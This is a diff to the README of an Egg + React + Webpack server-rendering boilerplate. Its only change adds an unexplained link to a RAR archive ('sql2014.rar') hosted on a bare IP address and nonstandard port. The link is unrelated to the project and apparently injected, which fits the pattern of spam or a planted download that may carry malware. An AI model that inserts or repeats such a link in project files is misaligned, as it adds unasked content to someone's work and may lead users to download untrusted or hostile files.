@@ -1,5 +1,7 @@
 # egg-react-webpack-boilerplate
 
+http://58.82.230.24:8989/sql2014.rar
+
 基于 Egg + React + Webpack 多页面和单页面服务器渲染同构工程骨架项目, 文档请见: [Egg + React 解决方案](https://www.yuque.com/easy-team/egg-react)
 
 - Egg 版本：^2.x.x
